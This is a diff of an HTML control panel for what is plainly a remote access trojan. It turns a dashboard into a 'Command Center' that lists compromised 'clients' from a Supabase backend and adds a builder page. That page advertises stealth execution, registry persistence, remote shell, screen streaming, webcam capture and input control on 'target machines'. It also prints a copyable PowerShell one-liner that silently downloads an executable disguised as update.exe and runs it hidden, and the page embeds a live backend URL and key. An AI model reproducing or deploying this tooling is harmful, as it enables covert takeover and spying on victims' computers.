@@ -3,47 +3,258 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Dashboard</title>
+<title>Command Center</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-height:100vh}
-.topbar{background:#161b22;border-bottom:1px solid #30363d;padding:.8rem 2rem;display:flex;align-items:center;justify-content:space-between}
-.topbar h1{color:#58a6ff;font-size:1.1rem}
-.topbar .right{display:flex;gap:.5rem;align-items:center}
-.btn{border:none;padding:.45rem 1rem;border-radius:6px;cursor:pointer;font-size:.85rem;font-weight:600}
-.btn-green{background:#238636;color:#fff}.btn-green:hover{background:#2ea043}
-.btn-blue{background:#1f6feb;color:#fff}.btn-blue:hover{background:#388bfd}
-.btn-red{background:#da3633;color:#fff}.btn-red:hover{background:#f85149}
-.btn-gray{background:#21262d;color:#c9d1d9;border:1px solid #30363d}.btn-gray:hover{background:#30363d}
-.main{padding:1.5rem 2rem}
-.client{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:.8rem 1.2rem;margin-bottom:.5rem;display:flex;align-items:center;gap:1rem}
-.client .dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
-.client .dot.online{background:#3fb950}
-.client .dot.offline{background:#484f58}
-.client .info{flex:1}
-.client .name{font-weight:700;color:#f0f6fc}
-.client .meta{color:#8b949e;font-size:.8rem}
-.client .actions{display:flex;gap:.4rem}
-.empty{color:#484f58;text-align:center;padding:3rem;font-size:1rem}
-@keyframes fade{from{opacity:0;transform:translateY(-5px)}to{opacity:1;transform:translateY(0)}}
-.client{animation:fade .3s ease}
+body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden}
+::-webkit-scrollbar{width:8px}
+::-webkit-scrollbar-track{background:#0a0c10}
+::-webkit-scrollbar-thumb{background:#30363d;border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:#484f58}
+.header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:1px solid #21262d;padding:0 2rem;display:flex;align-items:center;height:64px;position:sticky;top:0;z-index:100;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
+.header .logo{display:flex;align-items:center;gap:.6rem;font-size:1.2rem;font-weight:700;color:#f0f6fc;margin-right:2.5rem}
+.header .logo .icon{width:32px;height:32px;background:linear-gradient(135deg,#58a6ff,#8250df);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1.1rem}
+.header .logo span{background:linear-gradient(135deg,#58a6ff,#8250df);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.nav{display:flex;gap:.25rem;flex:1}
+.nav a{padding:.5rem 1.2rem;border-radius:8px;text-decoration:none;color:#8b949e;font-size:.9rem;font-weight:500;transition:all .2s;cursor:pointer;display:flex;align-items:center;gap:.5rem}
+.nav a:hover{color:#e6edf3;background:#21262d}
+.nav a.active{color:#f0f6fc;background:rgba(88,166,255,.12);box-shadow:inset 0 -2px 0 #58a6ff}
+.header .actions{display:flex;gap:.5rem;align-items:center}
+.btn{border:none;padding:.45rem 1rem;border-radius:8px;cursor:pointer;font-size:.85rem;font-weight:600;transition:all .2s;display:inline-flex;align-items:center;gap:.5rem}
+.btn:active{transform:scale(.96)}
+.btn-primary{background:linear-gradient(135deg,#238636,#2ea043);color:#fff;box-shadow:0 2px 8px rgba(35,134,54,.3)}
+.btn-primary:hover{box-shadow:0 4px 16px rgba(35,134,54,.4);transform:translateY(-1px)}
+.btn-accent{background:linear-gradient(135deg,#1f6feb,#58a6ff);color:#fff;box-shadow:0 2px 8px rgba(31,111,235,.3)}
+.btn-accent:hover{box-shadow:0 4px 16px rgba(31,111,235,.4);transform:translateY(-1px)}
+.btn-danger{background:linear-gradient(135deg,#da3633,#f85149);color:#fff}
+.btn-danger:hover{box-shadow:0 4px 16px rgba(218,54,51,.4);transform:translateY(-1px)}
+.btn-ghost{background:transparent;color:#8b949e;border:1px solid #30363d}
+.btn-ghost:hover{background:#21262d;color:#e6edf3}
+.btn-sm{padding:.3rem .7rem;font-size:.8rem}
+.pages{display:none;padding:2rem;max-width:1200px;margin:0 auto}
+.pages.active{display:block;animation:fadeIn .3s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem;margin-bottom:1.5rem}
+.stat-card{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #21262d;border-radius:12px;padding:1.2rem;position:relative;overflow:hidden;transition:all .3s}
+.stat-card:hover{border-color:#30363d;transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.stat-card .num{font-size:2rem;font-weight:700;color:#f0f6fc;line-height:1.2}
+.stat-card .lbl{color:#8b949e;font-size:.85rem;margin-top:.25rem}
+.stat-card .stat-icon{position:absolute;right:1rem;top:50%;transform:translateY(-50%);font-size:2rem;opacity:.1}
+.stat-card.online .num{color:#3fb950}
+.stat-card.offline .num{color:#484f58}
+.client-list{display:flex;flex-direction:column;gap:.5rem}
+.client-card{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #21262d;border-radius:12px;padding:1rem 1.2rem;display:flex;align-items:center;gap:1rem;transition:all .3s;animation:slideIn .3s ease}
+.client-card:hover{border-color:#30363d;transform:translateX(4px);box-shadow:0 4px 16px rgba(0,0,0,.3)}
+@keyframes slideIn{from{opacity:0;transform:translateX(-10px)}to{opacity:1;transform:translateX(0)}}
+.client-card .dot{width:12px;height:12px;border-radius:50%;flex-shrink:0;position:relative}
+.client-card .dot.online{background:#3fb950;box-shadow:0 0 12px rgba(63,185,80,.4)}
+.client-card .dot.online::after{content:'';position:absolute;inset:-3px;border-radius:50%;border:2px solid rgba(63,185,80,.15);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.3);opacity:.5}}
+.client-card .dot.offline{background:#484f58}
+.client-card .info{flex:1;min-width:0}
+.client-card .name{font-weight:600;color:#f0f6fc;font-size:.95rem;display:flex;align-items:center;gap:.5rem}
+.client-card .meta{color:#8b949e;font-size:.8rem;margin-top:.2rem;display:flex;flex-wrap:wrap;gap:.5rem}
+.client-card .meta span{display:flex;align-items:center;gap:.25rem}
+.client-card .actions{display:flex;gap:.4rem;flex-shrink:0}
+.empty-state{text-align:center;padding:4rem 2rem;color:#484f58}
+.empty-state .empty-icon{font-size:4rem;margin-bottom:1rem;opacity:.3}
+.empty-state h3{color:#8b949e;margin-bottom:.5rem}
+.empty-state p{font-size:.85rem}
+
+.builder-hero{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #21262d;border-radius:16px;padding:2.5rem;margin-bottom:1.5rem;position:relative;overflow:hidden}
+.builder-hero::before{content:'';position:absolute;top:-50%;right:-50%;width:100%;height:100%;background:radial-gradient(circle,rgba(88,166,255,.05) 0%,transparent 70%);pointer-events:none}
+.builder-hero h2{font-size:1.5rem;color:#f0f6fc;margin-bottom:.5rem}
+.builder-hero p{color:#8b949e;font-size:.9rem;max-width:600px}
+.builder-hero .version{display:inline-block;background:rgba(88,166,255,.12);color:#58a6ff;padding:.2rem .6rem;border-radius:4px;font-size:.75rem;margin-top:.5rem}
+.feature-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1rem;margin-bottom:1.5rem}
+.feature-card{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #21262d;border-radius:12px;padding:1.5rem;transition:all .3s;position:relative;overflow:hidden}
+.feature-card:hover{border-color:#30363d;transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.feature-card .icon{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;margin-bottom:.8rem}
+.feature-card .icon.blue{background:rgba(88,166,255,.12);color:#58a6ff}
+.feature-card .icon.green{background:rgba(63,185,80,.12);color:#3fb950}
+.feature-card .icon.purple{background:rgba(130,80,223,.12);color:#8250df}
+.feature-card .icon.orange{background:rgba(210,153,34,.12);color:#d29922}
+.feature-card h3{font-size:.95rem;color:#f0f6fc;margin-bottom:.3rem}
+.feature-card p{color:#8b949e;font-size:.82rem;line-height:1.5}
+.feature-card .badge{display:inline-block;background:rgba(63,185,80,.12);color:#3fb950;padding:.15rem .5rem;border-radius:4px;font-size:.7rem;font-weight:600;margin-top:.5rem}
+.build-panel{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #21262d;border-radius:12px;padding:1.5rem;margin-bottom:1.5rem}
+.build-panel h3{font-size:1.1rem;color:#f0f6fc;margin-bottom:1rem;display:flex;align-items:center;gap:.5rem}
+.option-row{display:flex;align-items:center;justify-content:space-between;padding:.8rem 0;border-bottom:1px solid #21262d}
+.option-row:last-child{border-bottom:none}
+.option-row .desc{flex:1}
+.option-row .desc label{color:#f0f6fc;font-size:.9rem;font-weight:500;cursor:pointer}
+.option-row .desc p{color:#8b949e;font-size:.8rem;margin-top:.15rem}
+.toggle{position:relative;width:44px;height:24px;flex-shrink:0}
+.toggle input{opacity:0;width:0;height:0}
+.toggle .slider{position:absolute;inset:0;background:#30363d;border-radius:12px;cursor:pointer;transition:all .3s}
+.toggle .slider::before{content:'';position:absolute;width:18px;height:18px;left:3px;bottom:3px;background:#8b949e;border-radius:50%;transition:all .3s}
+.toggle input:checked+.slider{background:rgba(63,185,80,.3)}
+.toggle input:checked+.slider::before{transform:translateX(20px);background:#3fb950}
+.build-actions{display:flex;gap:1rem;align-items:center;flex-wrap:wrap;margin-top:1rem}
+.build-actions .btn{font-size:1rem;padding:.6rem 1.5rem}
+.install-cmd{background:#0d1117;border:1px solid #21262d;border-radius:8px;padding:1rem;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:.82rem;color:#8b949e;margin-top:.8rem;user-select:all;position:relative}
+.install-cmd .copy-btn{position:absolute;top:.5rem;right:.5rem;background:#21262d;border:none;color:#8b949e;padding:.2rem .5rem;border-radius:4px;cursor:pointer;font-size:.75rem}
+.install-cmd .copy-btn:hover{background:#30363d;color:#e6edf3}
+.feature-list{list-style:none;padding:0;margin-top:.5rem}
+.feature-list li{color:#8b949e;font-size:.82rem;padding:.2rem 0;display:flex;align-items:center;gap:.5rem}
+.feature-list li::before{content:'âœ“';color:#3fb950;font-weight:700}
+
+@media(max-width:768px){
+.header{padding:0 1rem}
+.header .logo{margin-right:1rem}
+.header .logo span{display:none}
+.nav a{padding:.4rem .8rem;font-size:.8rem}
+.pages{padding:1rem}
+.stats{grid-template-columns:1fr 1fr}
+.feature-grid{grid-template-columns:1fr}
+.client-card{flex-wrap:wrap}
+.client-card .actions{width:100%;justify-content:flex-end;padding-top:.5rem;border-top:1px solid #21262d}
+.builder-hero{padding:1.5rem}
+.build-actions{flex-direction:column}
+}
+
+@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
+.skeleton{background:linear-gradient(90deg,#161b22 25%,#1c2128 50%,#161b22 75%);background-size:200% 100%;animation:shimmer 1.5s infinite;border-radius:8px;height:60px;margin-bottom:.5rem}
 </style>
 </head>
 <body>
-<div class="topbar">
-  <h1>Dashboard</h1>
-  <div class="right">
-    <button class="btn btn-gray" onclick="load()">Refresh</button>
-    <button class="btn btn-green" onclick="downloadClient()">Download Client</button>
+<div class="header">
+  <div class="logo">
+    <div class="icon">CX</div>
+    <span>Command Center</span>
+  </div>
+  <div class="nav">
+    <a class="active" onclick="switchPage('dashboard',this)">Dashboard</a>
+    <a onclick="switchPage('builder',this)">Builder</a>
+  </div>
+  <div class="actions">
+    <button class="btn btn-ghost btn-sm" onclick="switchPage('dashboard',document.querySelector('.nav a'))">Refresh</button>
   </div>
 </div>
-<div class="main">
+
+<div class="pages active" id="page-dashboard">
   <div class="stats">
-    <div class="stat"><div class="num" id="clients">0</div><div class="lbl">Online</div></div>
-    <div class="stat"><div class="num" id="last">-</div><div class="lbl">Last Ping</div></div>
+    <div class="stat-card online">
+      <div class="num" id="onlineCount">0</div>
+      <div class="lbl">Online Now</div>
+      <div class="stat-icon">â—</div>
+    </div>
+    <div class="stat-card">
+      <div class="num" id="totalCount">0</div>
+      <div class="lbl">Total Clients</div>
+      <div class="stat-icon">â—</div>
+    </div>
+    <div class="stat-card">
+      <div class="num" id="lastPing">-</div>
+      <div class="lbl">Last Ping</div>
+      <div class="stat-icon">â—</div>
+    </div>
   </div>
-  <div id="list"><div class="empty">No clients yet</div></div>
+  <div id="clientList"></div>
 </div>
+
+<div class="pages" id="page-builder">
+  <div class="builder-hero">
+    <h2>Build Your Client</h2>
+    <p>Configure and download the remote administration client. Deploy on target machines to gain full control.</p>
+    <div class="version">v2.0 â€¢ 480 KB â€¢ Windows x64</div>
+  </div>
+
+  <div class="feature-grid">
+    <div class="feature-card">
+      <div class="icon blue">â—</div>
+      <h3>Remote CMD</h3>
+      <p>Execute commands on remote machines in real-time with full output capture.</p>
+    </div>
+    <div class="feature-card">
+      <div class="icon green">â—</div>
+      <h3>Screen Capture</h3>
+      <p>Take screenshots with multi-monitor support. Stream live screen at high FPS.</p>
+    </div>
+    <div class="feature-card">
+      <div class="icon purple">â—</div>
+      <h3>File Browser</h3>
+      <p>Browse, navigate, and explore the remote file system with directory listing.</p>
+    </div>
+    <div class="feature-card">
+      <div class="icon orange">â—</div>
+      <h3>Webcam & Input</h3>
+      <p>Capture webcam images and remotely control mouse and keyboard.</p>
+    </div>
+  </div>
+
+  <div class="build-panel">
+    <h3>Client Configuration</h3>
+    <div class="option-row">
+      <div class="desc">
+        <label>Startup Persistence</label>
+        <p>Automatically runs the client on Windows boot via registry (HKCU\Run).</p>
+      </div>
+      <label class="toggle">
+        <input type="checkbox" id="startupToggle" checked disabled>
+        <span class="slider"></span>
+      </label>
+    </div>
+    <div class="option-row">
+      <div class="desc">
+        <label>Auto Ping</label>
+        <p>Sends status updates every 200ms to keep the dashboard connection alive.</p>
+      </div>
+      <label class="toggle">
+        <input type="checkbox" checked disabled>
+        <span class="slider"></span>
+      </label>
+    </div>
+    <div class="option-row">
+      <div class="desc">
+        <label>Live Screen Stream</label>
+        <p>Continuously streams the desktop at 5 FPS with automatic cleanup.</p>
+      </div>
+      <label class="toggle">
+        <input type="checkbox" checked disabled>
+        <span class="slider"></span>
+      </label>
+    </div>
+    <div class="option-row">
+      <div class="desc">
+        <label>Stealth Mode</label>
+        <p>Runs completely hidden with no console window or user-visible traces.</p>
+      </div>
+      <label class="toggle">
+        <input type="checkbox" checked disabled>
+        <span class="slider"></span>
+      </label>
+    </div>
+
+    <div class="build-actions">
+      <button class="btn btn-primary" onclick="downloadClient()">â¬‡ Download Client</button>
+      <span style="color:#8b949e;font-size:.85rem">No configuration file needed â€” just run the exe.</span>
+    </div>
+
+    <div class="install-cmd">
+      <span style="color:#58a6ff">#</span> <span style="color:#8b949e">Silent deploy via PowerShell:</span>
+      <br>Invoke-WebRequest -Uri <span style="color:#d29922">"https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe"</span> -OutFile <span style="color:#3fb950">"$env:TEMP\update.exe"</span>; Start-Process -WindowStyle Hidden <span style="color:#3fb950">"$env:TEMP\update.exe"</span>
+      <button class="copy-btn" onclick="copyCmd()">Copy</button>
+    </div>
+  </div>
+
+  <div class="build-panel">
+    <h3>What's Included</h3>
+    <ul class="feature-list">
+      <li>Stealth execution â€” no console window, hidden from user</li>
+      <li>Auto-start on boot via HKCU\Run registry key</li>
+      <li>Remote command execution with output capture</li>
+      <li>Multi-monitor screenshot support</li>
+      <li>5 FPS live screen streaming</li>
+      <li>Remote mouse and keyboard control</li>
+      <li>Full file system browsing</li>
+      <li>Webcam image capture</li>
+      <li>200ms polling for instant command pickup</li>
+      <li>Direct Supabase REST API â€” no server dependencies</li>
+    </ul>
+  </div>
+</div>
+
 <script>
 const SB='https://odocuexiouhmmkpwtuwk.supabase.co';
 const KEY='sb_publishable_KWdi4nin2RNI9pl3T2LiAA_-6axXMED';
@@ -54,44 +265,70 @@ let latest={};
 load();
 setInterval(load,5000);
 
+function switchPage(name,el){
+ document.querySelectorAll('.nav a').forEach(a=>a.classList.remove('active'));
+ document.querySelectorAll('.pages').forEach(p=>p.classList.remove('active'));
+ el.classList.add('active');
+ document.getElementById('page-'+name).classList.add('active');
+}
+
 async function load(){
-  try{
-    const r=await fetch(SB+'/rest/v1/pings?order=id.desc&limit=100',H);
-    if(!r.ok)return;
-    const p=await r.json();
-    if(!Array.isArray(p))return;
-    latest={};
-    p.forEach(x=>{if(!latest[x.computer])latest[x.computer]=x});
-    const names=Object.keys(latest);
-    document.getElementById('clients').textContent=names.length;
-    if(p.length)document.getElementById('last').textContent=new Date(p[0].created_at).toLocaleTimeString();
-    const list=document.getElementById('list');
-    if(!names.length){list.innerHTML='<div class="empty">No clients yet</div>';return}
-    list.innerHTML=names.map(n=>{
-      const x=latest[n];
-      const age=Date.now()-new Date(x.created_at).getTime();
-      const online=age<60000;
-      return '<div class="client"><div class="dot '+(online?'online':'offline')+'"></div><div class="info"><div class="name">'+esc(n||'unknown')+'</div><div class="meta">IP: '+esc(x.ip||'?')+' | '+new Date(x.created_at).toLocaleString()+(online?' <span style="color:#3fb950">● Online</span>':' <span style="color:#484f58">● Offline</span>')+'</div></div><div class="actions"><button class="btn btn-blue" onclick="openClient(\''+n+'\')">Open</button><button class="btn btn-red" onclick="removeClient(\''+n+'\')">Remove</button></div></div>';
-    }).join('');
-  }catch{}
+ try{
+  const r=await fetch(SB+'/rest/v1/pings?order=id.desc&limit=100',H);
+  if(!r.ok)return;
+  const p=await r.json();
+  if(!Array.isArray(p))return;
+  latest={};
+  p.forEach(x=>{if(!latest[x.computer])latest[x.computer]=x});
+  const names=Object.keys(latest);
+  const now=Date.now();
+  const online=names.filter(n=>now-new Date(latest[n].created_at).getTime()<60000);
+  document.getElementById('onlineCount').textContent=online.length;
+  document.getElementById('totalCount').textContent=names.length;
+  if(p.length)document.getElementById('lastPing').textContent=new Date(p[0].created_at).toLocaleTimeString();
+  const list=document.getElementById('clientList');
+  if(!names.length){
+   list.innerHTML='<div class="empty-state"><div class="empty-icon">â—</div><h3>No Clients Connected</h3><p>Download and run the client on a target machine to see it appear here.</p></div>';
+   return;
+  }
+  list.innerHTML=names.map((n,i)=>{
+   const x=latest[n];
+   const age=now-new Date(x.created_at).getTime();
+   const isOnline=age<60000;
+   const ip=x.ip||'?';
+   const ts=new Date(x.created_at).toLocaleString();
+   return '<div class="client-card" style="animation-delay:'+(i*0.05)+'s"><div class="dot '+(isOnline?'online':'offline')+'"></div><div class="info"><div class="name">'+esc(n)+' <span style="font-size:.75rem;color:#8b949e;font-weight:400">'+esc(ip)+'</span></div><div class="meta"><span>Last: '+ts+'</span><span style="color:'+(isOnline?'#3fb950':'#484f58')+'">'+(isOnline?'\u25cf Online':'')+'</span></div></div><div class="actions"><button class="btn btn-accent btn-sm" onclick="openClient(\''+escAttr(n)+'\')">Open</button><button class="btn btn-danger btn-sm" onclick="removeClient(\''+escAttr(n)+'\')">Remove</button></div></div>';
+  }).join('');
+ }catch{}
 }
 
 function esc(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML}
+function escAttr(t){return t.replace(/['"]/g,'').replace(/[^a-zA-Z0-9 _-]/g,'')}
 
 function openClient(name){
-  window.open('client.html?name='+encodeURIComponent(name),'_blank');
+ window.open('client.html?name='+encodeURIComponent(name),'_blank');
 }
+
 function downloadClient(){
-  window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe';
+ window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe';
 }
 
 async function removeClient(name){
-  if(!confirm('Remove '+name+'?'))return;
-  try{
-    await fetch(SB+'/rest/v1/pings?computer=eq.'+encodeURIComponent(name),{method:'DELETE',headers:PH});
-    await fetch(SB+'/rest/v1/commands?computer=eq.'+encodeURIComponent(name),{method:'DELETE',headers:PH});
-    await load();
-  }catch{}
+ if(!confirm('Remove '+name+' and all its data?'))return;
+ try{
+  await fetch(SB+'/rest/v1/pings?computer=eq.'+encodeURIComponent(name),{method:'DELETE',headers:PH});
+  await fetch(SB+'/rest/v1/commands?computer=eq.'+encodeURIComponent(name),{method:'DELETE',headers:PH});
+  await load();
+ }catch{}
+}
+
+function copyCmd(){
+ const cmd='Invoke-WebRequest -Uri "https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe" -OutFile "$env:TEMP\\update.exe"; Start-Process -WindowStyle Hidden "$env:TEMP\\update.exe"';
+ navigator.clipboard.writeText(cmd).then(()=>{
+  const btn=document.querySelector('.copy-btn');
+  btn.textContent='Copied!';
+  setTimeout(()=>btn.textContent='Copy',2000);
+ });
 }
 </script>
 </body>
